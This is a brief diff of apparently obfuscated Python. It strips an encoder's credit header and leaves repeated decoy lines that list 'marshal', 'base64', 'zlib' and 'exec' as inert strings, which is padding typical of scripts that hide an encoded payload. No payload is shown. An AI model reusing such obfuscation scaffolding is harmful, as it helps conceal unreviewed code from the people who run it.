@@ -1,8 +1,3 @@
-# Enc by : Ryougaa__XD
-# Github : https://github.com/ferlyafriliyan
-# Terima kasih sudah menggunakan script ini :)
-
-# Variable teks : 4458 Line
 Ryougaa__=("https://ferlyafriliyan.vercel.app");Hidekii_=("https://github.com/ferlyafriliyan");["from","import","as","marshal","base64","zlib","((","))","exec","exec(",]
 Ryougaa__=("https://ferlyafriliyan.vercel.app");Hidekii_=("https://github.com/ferlyafriliyan");["from","import","as","marshal","base64","zlib","((","))","exec","exec(",]
 Ryougaa__=("https://ferlyafriliyan.vercel.app");Hidekii_=("https://github.com/ferlyafriliyan");["from","import","as","marshal","base64","zlib","((","))","exec","exec(",]
